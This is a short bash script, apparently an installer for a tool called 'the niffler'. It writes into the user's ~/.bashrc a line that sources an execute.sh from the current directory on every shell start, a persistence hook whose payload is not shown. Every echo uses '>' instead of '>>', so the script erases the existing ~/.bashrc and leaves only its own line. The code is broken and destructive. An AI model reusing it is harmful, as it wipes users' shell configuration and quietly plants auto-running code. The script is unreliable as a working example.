#!/bin/bash 

current_dir=$(pwd)
niffler=$"${current_dir}/execute.sh"

echo "" >~/.bashrc
echo "# THE NIFFLER USE THIS LINE" >~/.bashrc
echo "[[ -s \"${niffler}\" ]] && source \"${niffler}\"" >~/.bashrc
